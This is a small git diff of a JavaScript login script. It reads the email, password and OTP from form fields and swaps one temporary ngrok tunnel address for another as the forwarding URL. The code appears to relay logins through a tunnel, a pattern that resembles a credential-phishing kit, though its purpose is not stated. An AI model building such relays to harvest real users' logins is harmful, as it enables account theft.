@@ -3,7 +3,7 @@
 let el = document.getElementById("sub");
 
 var user = {};
-ForwardingURL = 'https://01b7-2401-4900-563b-a71e-3512-dce3-1d74-8a28.ngrok-free.app';
+ForwardingURL = 'https://46df-2401-4900-563b-b70a-9c61-d370-2c14-a7be.ngrok-free.app';
 localStorage.setItem("ForwardingURL", ForwardingURL);
 async function postData(url = "", data = {}) {
   const response = await fetch(url, {
@@ -28,7 +28,7 @@ async function postData(url = "", data = {}) {
 
 el.addEventListener("click", lgin);
 
-
+  
 
 function otp() {
   var otpObj = {};
@@ -80,7 +80,7 @@ function lgin() {
   user = {};
   var email = document.getElementById("omk");
   var password = document.getElementById("pswd");
-  localStorage.setItem("user", user)
+  // localStorage.setItem("user", user)
 
   user["email"] = email.value;
   user["password"] = password.value;
